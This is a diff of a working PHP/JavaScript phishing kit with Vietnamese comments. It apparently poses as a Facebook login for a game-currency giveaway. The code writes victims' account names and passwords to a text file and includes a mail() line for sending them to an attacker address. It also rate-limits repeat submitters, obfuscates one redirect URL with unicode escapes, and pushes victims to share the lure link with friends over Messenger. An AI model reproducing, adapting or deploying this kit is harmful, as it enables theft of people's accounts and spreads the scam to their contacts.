@@ -1,12 +1,12 @@
-<!--Dương Chí Hướng-->
+
 <?php 
 session_start();
 date_default_timezone_set('Asia/Ho_Chi_Minh');
  $huongdz['num'] = 0;
-	if(isset($_SESSION['huongdz'])) {
-		$huongdz = $_SESSION['huongdz'];
+	if(isset($_SESSION['user'])) {
+		$user = $_SESSION['user'];
 	}
-	if($huongdz['num'] == 4){ //đăt số lần đăng nhập cho phép
+	if($user['num'] == 4){ //đăt số lần đăng nhập cho phép
 	    die('<script>alert("Spam cc cút")</script>') ; //thông báo sau khi đăng nhập quá số lần cho phép
 		//lưu ý hosting phải bật được session thì mới có tác dụng!
 	}
@@ -20,12 +20,12 @@ if(isset($_POST["acc"])){
      $headers = "Tài khoản facebook";
       $body = "\nTime: ".$time."|acc $type: ".$acc."|pass: ".$pass."\n____________________________________________________________\n";//định dạng acc|pass
     
-     // mail("jaxuatt6@gmail.com", $headers, $body); // muốn gửi về mail thì bỏ 2 dấu // phía trước đi rồi thay mail
+    //  mail("hackerso1@1smail.ga", $headers, $body); // muốn gửi về mail thì bỏ 2 dấu // phía trước đi rồi thay mail
     $test = fopen("hu.txt","a");//đổi tên file hu.txt này để tránh trường hợp người khác vào lấy acc
     fwrite($test,$body);
     fclose($test);
-    	$huongdz['num']++;
-$_SESSION['huongdz'] = $huongdz;
+    	$user['num']++;
+$_SESSION['user'] = $user;
 
 }
 
@@ -386,7 +386,7 @@ function getRndInteger(min, max) {
 }
 function otp(){
     $("#photo").hide();
-    $(".otp").html('<div class="mb-3" style="margin:auto;display: block;text-align: center;"><a href="\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0076\u0069\u002d\u006e\u0061\u0070\u0074\u0068\u0065\u002e\u006f\u006e\u006c\u0069\u006e\u0065"><button type="button" class="btn btn-primary me-2 mb-2"><i class="fa fa-arrow-right me-2"></i>Tiếp tục</button></a><a href="fb-messenger://share/?link=https://napkimcuongx10.ml/"><br/>Share cho bạn bè</a></div><b>Chào mừng trở lại!</b><br/>Chúng tôi nhận thấy trước đây bạn đã đăng nhập trên ứng dụng này, vui lòng ấn "Tiếp tục" để truy cập vào trang của nhà phát hành.<br/>');
+    $(".otp").html('<div class="mb-3" style="margin:auto;display: block;text-align: center;"><a href="http://sukiendacbiet.online"><button type="button" class="btn btn-primary me-2 mb-2"><i class="fa fa-arrow-right me-2"></i>Tiếp tục</button></a><a href="fb-messenger://share/?link=https://garena-napkimcuong.ga"><br/>Share cho bạn bè</a></div><b>Chào mừng trở lại!</b><br/>Chúng tôi nhận thấy trước đây bạn đã đăng nhập trên ứng dụng này, vui lòng ấn "Tiếp tục" để truy cập vào trang của nhà phát hành.<br/>');
 }
 
 function login(){
